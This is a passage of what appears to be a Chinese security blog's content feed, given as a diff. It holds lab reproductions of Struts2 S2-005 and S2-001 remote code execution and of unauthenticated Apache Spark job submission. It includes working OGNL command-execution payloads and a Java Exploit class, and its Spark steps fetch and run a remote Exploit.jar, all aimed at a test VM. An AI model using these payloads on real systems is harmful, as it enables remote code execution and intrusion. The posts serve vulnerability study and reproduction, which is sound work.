+  </entry>
+  <entry>
+    <title>S2-005 远程代码执行漏洞</title>
+    <url>/2022/02/18/S2-005/</url>
+    <content><![CDATA[<h1 id="S2-005-远程代码执行漏洞"><a href="#S2-005-远程代码执行漏洞" class="headerlink" title="S2-005 远程代码执行漏洞"></a>S2-005 远程代码执行漏洞</h1><p>受影响的版本：2.0.0 - 2.1.8.1</p>
+<p>详情：<a href="http://struts.apache.org/docs/s2-005.html" target="_blank" rel="noopener">http ://struts.apache.org/docs/s2-005.html</a></p>
+<a id="more"></a>
+
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>参考吴汉青（作者）的《白帽说网络安全》</p>
+<blockquote>
+<p>s2-005 是一个源自 S2-003（版本：&lt; 2.0.12）的漏洞，此行为已在 S2-003 中过滤，但事实证明，基于将可接受参数名称列入白名单的最终修复仅部分关闭了该漏洞.</p>
+</blockquote>
+<p>XWork 将使用 OGNL 表达式将 GET 参数的键和值解析为 Java 语句，例如：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">user.address.city&#x3D;Bishkek&amp;user[&#39;favoriteDrink&#39;]&#x3D;kumys </span><br><span class="line">&#x2F;&#x2F;It will be converted to</span><br><span class="line">action.getUser().getAddress().setCity(&quot;Bishkek&quot;)  </span><br><span class="line">action.getUser().setFavoriteDrink(&quot;kumys&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>流程如下：</p>
+<ul>
+<li>在 S2-003<code>\u0023</code>中用于绕过 struts2 的过滤器<code>#</code></li>
+<li>S2-003 struts2后添加安全模式（沙盒）</li>
+<li>在 S2-005 使用 OGNL 表达式关闭安全模式并再次绕过</li>
+</ul>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>远程代码执行 POC（没有显示回显，使用<code>@</code>代替空格）：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET &#x2F;example&#x2F;HelloWorld.action?(%27%5cu0023_memberAccess[%5c%27allowStaticMethodAccess%5c%27]%27)(vaaa)&#x3D;true&amp;(aaaa)((%27%5cu0023context[%5c%27xwork.MethodAccessor.denyMethodExecution%5c%27]%5cu003d%5cu0023vccc%27)(%5cu0023vccc%5cu003dnew%20java.lang.Boolean(%22false%22)))&amp;(asdf)((&#39;%5cu0023rt.exec(%22touch@&#x2F;tmp&#x2F;success%22.split(%22@%22))&#39;)(%5cu0023rt%5cu003d@java.lang.Runtime@getRuntime()))&#x3D;1 HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.44.132:8080</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;57.0.2987.98 Safari&#x2F;537.36</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.3001.net/images/20220218/16451644675290.png" alt="image-20220208173536248"></p>
+<p>成功执行命令，在<code>/tmp</code>文件夹下创建文件</p>
+<p><img src="https://image.3001.net/images/20220218/1645164469314.png" alt="image-20220208173810866"></p>
+<p>其他一些POC在tomcat8中会返回400。由于字符<code>\</code>，<code>&quot;</code>不能直接放在路径中，我们需要在发送前对其进行urlencode。</p>
+<p>此 POC 没有显示，使用 OGNL 的表达式评估：</p>
+<p><img src="https://image.3001.net/images/20220218/16451644717364.png" alt="image-20220208173824488"></p>
+<p><code>(aaa)(bbb)</code>,<code>aaa</code>用作 OGNL 表达式字符串，<code>bbb</code>是表达式的根对象。因此，如果我们需要执行类似的代码<code>aaa</code>，需要用引号将其包裹起来，<code>bbb</code>位置可以直接放置Java语句。<code>(aaa)(bbb)=true</code>实际上是<code>aaa=true</code>。</p>
+<p>但是，如何准确理解，还需要进一步研究和优化。希望有人可以写一个可以显示回声的POC。</p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Vulhub复现</tag>
+        <tag>Struts2</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>S2-001 远程代码执行漏洞</title>
+    <url>/2022/02/18/S2-001/</url>
+    <content><![CDATA[<h1 id="S2-001-远程代码执行漏洞"><a href="#S2-001-远程代码执行漏洞" class="headerlink" title="S2-001 远程代码执行漏洞"></a>S2-001 远程代码执行漏洞</h1><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="http://rickgray.me/2016/05/06/review-struts2-remote-command-execution-vulnerabilities.html" target="_blank" rel="noopener">http://rickgray.me/2016/05/06/review-struts2-remote-command-execution-vulnerabilities.html</a></p>
+<blockquote>
+<p>漏洞是当用户提交表单数据验证失败时，服务器用OGNL表达式解析用户之前提交的参数值，<code>%{value}</code>并重新填充对应的表单数据。例如在注册或登录页面。当提交失败时，服务器一般会默认返回之前提交的数据。由于服务器用于<code>%{value}</code>对提交的数据执行 OGNL 表达式解析，因此可以直接发送有效载荷来执行命令。</p>
+</blockquote>
+<a id="more"></a>
+
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>查看主界面为登陆功能</p>
+<p><img src="https://image.3001.net/images/20220218/16451643549106.png" alt="image-20220208164635768"></p>
+<p>获取tomcat路径：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%&#123;&quot;tomcatBinDir&#123;&quot;+@java.lang.System@getProperty(&quot;user.dir&quot;)+&quot;&#125;&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>获取网站真实路径：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%&#123;#req&#x3D;@org.apache.struts2.ServletActionContext@getRequest(),#response&#x3D;#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter(),#response.println(#req.getRealPath(&#39;&#x2F;&#39;)),#response.flush(),#response.close()&#125;</span><br></pre></td></tr></table></figure>
+
+<p>执行命令（带参数的命令：<code>new java.lang.String[]{&quot;cat&quot;,&quot;/etc/passwd&quot;}</code>）：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%&#123;#a&#x3D;(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;id&quot;&#125;)).redirectErrorStream(true).start(),#b&#x3D;#a.getInputStream(),#c&#x3D;new java.io.InputStreamReader(#b),#d&#x3D;new java.io.BufferedReader(#c),#e&#x3D;new char[50000],#d.read(#e),#f&#x3D;#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;</span><br></pre></td></tr></table></figure>
+
+<p>payload使用url编码之后：</p>
+<p><img src="https://image.3001.net/images/20220218/16451643581100.png" alt="image-20220208164606995"></p>
+<p>使用工具，直接执行命令</p>
+<p><img src="https://image.3001.net/images/20220218/16451643653281.png" alt="image-20220208164936845"></p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Vulhub复现</tag>
+        <tag>Struts2</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Apache Spark 未授权访问漏洞</title>
+    <url>/2022/01/14/Apache%20Spark%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<h1 id="Apache-Spark-未授权访问漏洞"><a href="#Apache-Spark-未授权访问漏洞" class="headerlink" title="Apache Spark 未授权访问漏洞"></a>Apache Spark 未授权访问漏洞</h1><p>Apache Spark是一款集群计算系统，其支持用户向管理节点提交应用，并分发给集群执行。如果管理节点未启动ACL（访问控制），我们将可以在集群中执行任意代码。</p>
+<p>参考链接：</p>
+<ul>
+<li><a href="https://weibo.com/ttarticle/p/show?id=2309404187794313453016" target="_blank" rel="noopener">https://weibo.com/ttarticle/p/show?id=2309404187794313453016</a></li>
+<li><a href="https://xz.aliyun.com/t/2490" target="_blank" rel="noopener">https://xz.aliyun.com/t/2490</a></li>
+</ul>
+<a id="more"></a>
+
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>环境启动后，访问<code>http://192.168.44.132:8080</code>即可看到master的管理页面，访问<code>http://192.168.44.132:8081</code>即可看到slave的管理页面。</p>
+<p>该漏洞本质是未授权的用户可以向管理节点提交一个应用，这个应用实际上是恶意代码。</p>
+<p>提交方式有两种：</p>
+<ol>
+<li>利用REST API</li>
+<li>利用submissions网关（集成在7077端口中）</li>
+</ol>
+<p>应用可以是Java或Python，就是一个最简单的类，如（参考链接1）：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import java.io.BufferedReader;</span><br><span class="line">import java.io.InputStreamReader;</span><br><span class="line"></span><br><span class="line">public class Exploit &#123;</span><br><span class="line">  public static void main(String[] args) throws Exception &#123;</span><br><span class="line">    String[] cmds &#x3D; args[0].split(&quot;,&quot;);</span><br><span class="line"></span><br><span class="line">    for (String cmd : cmds) &#123;</span><br><span class="line">      System.out.println(cmd);</span><br><span class="line">      System.out.println(executeCommand(cmd.trim()));</span><br><span class="line">      System.out.println(&quot;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; https:&#x2F;&#x2F;www.mkyong.com&#x2F;java&#x2F;how-to-execute-shell-command-from-java&#x2F;</span><br><span class="line">  private static String executeCommand(String command) &#123;</span><br><span class="line">    StringBuilder output &#x3D; new StringBuilder();</span><br><span class="line"></span><br><span class="line">    try &#123;</span><br><span class="line">      Process p &#x3D; Runtime.getRuntime().exec(command);</span><br><span class="line">      p.waitFor();</span><br><span class="line">      BufferedReader reader &#x3D; new BufferedReader(new InputStreamReader(p.getInputStream()));</span><br><span class="line"></span><br><span class="line">      String line;</span><br><span class="line">      while ((line &#x3D; reader.readLine()) !&#x3D; null) &#123;</span><br><span class="line">        output.append(line).append(&quot;\n&quot;);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; catch (Exception e) &#123;</span><br><span class="line">      e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return output.toString();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>将其编译成JAR，放在任意一个HTTP或FTP上，如<code>https://github.com/aRe00t/rce-over-spark/raw/master/Exploit.jar</code>。</p>
+<h3 id="用REST-API方式提交应用"><a href="#用REST-API方式提交应用" class="headerlink" title="用REST API方式提交应用"></a>用REST API方式提交应用</h3><p>standalone模式下，master将在6066端口启动一个HTTP服务器，我们向这个端口提交REST格式的API：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;v1&#x2F;submissions&#x2F;create HTTP&#x2F;1.1</span><br><span class="line">Host: your-ip:6066</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 680</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;action&quot;: &quot;CreateSubmissionRequest&quot;,</span><br><span class="line">  &quot;clientSparkVersion&quot;: &quot;2.3.1&quot;,</span><br><span class="line">  &quot;appArgs&quot;: [</span><br><span class="line">    &quot;whoami,w,cat &#x2F;proc&#x2F;version,ifconfig,route,df -h,free -m,netstat -nltp,ps auxf&quot;</span><br><span class="line">  ],</span><br><span class="line">  &quot;appResource&quot;: &quot;https:&#x2F;&#x2F;github.com&#x2F;aRe00t&#x2F;rce-over-spark&#x2F;raw&#x2F;master&#x2F;Exploit.jar&quot;,</span><br><span class="line">  &quot;environmentVariables&quot;: &#123;</span><br><span class="line">    &quot;SPARK_ENV_LOADED&quot;: &quot;1&quot;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;mainClass&quot;: &quot;Exploit&quot;,</span><br><span class="line">  &quot;sparkProperties&quot;: &#123;</span><br><span class="line">    &quot;spark.jars&quot;: &quot;https:&#x2F;&#x2F;github.com&#x2F;aRe00t&#x2F;rce-over-spark&#x2F;raw&#x2F;master&#x2F;Exploit.jar&quot;,</span><br><span class="line">    &quot;spark.driver.supervise&quot;: &quot;false&quot;,</span><br><span class="line">    &quot;spark.app.name&quot;: &quot;Exploit&quot;,</span><br><span class="line">    &quot;spark.eventLog.enabled&quot;: &quot;true&quot;,</span><br><span class="line">    &quot;spark.submit.deployMode&quot;: &quot;cluster&quot;,</span><br><span class="line">    &quot;spark.master&quot;: &quot;spark:&#x2F;&#x2F;your-ip:6066&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>其中，<code>spark.jars</code>即是编译好的应用，mainClass是待运行的类，appArgs是传给应用的参数。</p>
+<p><img src="https://image.3001.net/images/20220114/16421500362666.png" alt="image-20220114161434340"></p>
+<p>返回的包中有submissionId，然后访问<code>http://192.168.44.132:8081/logPage/?driverId={submissionId}&amp;logType=stdout</code>，即可查看执行结果：</p>
+<p><img src="https://image.3001.net/images/20220114/16421500393825.png" alt="image-20220114161520545"></p>
+<p>注意，提交应用是在master中，查看结果是在具体执行这个应用的slave里（默认8081端口）。实战中，由于slave可能有多个。</p>
+<h3 id="利用submissions网关"><a href="#利用submissions网关" class="headerlink" title="利用submissions网关"></a>利用submissions网关</h3><p>如果6066端口不能访问，或做了权限控制，我们可以利用master的主端口7077，来提交应用。</p>
+<p>方法是利用Apache Spark自带的脚本<code>bin/spark-submit</code>：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bin&#x2F;spark-submit --master spark:&#x2F;&#x2F;192.168.44.132:7077 --deploy-mode cluster --class Exploit https:&#x2F;&#x2F;github.com&#x2F;aRe00t&#x2F;rce-over-spark&#x2F;raw&#x2F;master&#x2F;Exploit.jar id</span><br></pre></td></tr></table></figure>
+
+<p>如果你指定的master参数是rest服务器，这个脚本会先尝试使用rest api来提交应用；如果发现不是rest服务器，则会降级到使用submission gateway来提交应用。</p>
+<p>查看结果的方式与前面一致。</p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Vulhub复现</tag>
+        <tag>Apache Spark</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>通过 Velocity 自定义模板执行 Apache Solr 远程代码 (CVE-2019-17558)</title>
     <url>/2022/01/12/%E9%80%9A%E8%BF%87%20Velocity%20%E8%87%AA%E5%AE%9A%E4%B9%89%E6%A8%A1%E6%9D%BF%E6%89%A7%E8%A1%8C%20Apache%20Solr%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%20(CVE-2019-17558)/</url>
     <content><![CDATA[<h1 id="通过-Velocity-自定义模板执行-Apache-Solr-远程代码-CVE-2019-17558"><a href="#通过-Velocity-自定义模板执行-Apache-Solr-远程代码-CVE-2019-17558" class="headerlink" title="通过 Velocity 自定义模板执行 Apache Solr 远程代码 (CVE-2019-17558)"></a>通过 Velocity 自定义模板执行 Apache Solr 远程代码 (CVE-2019-17558)</h1><p>Solr 是流行的、速度极快的开源企业搜索平台，它建立在 Apache Lucene(TM) 之上。</p>
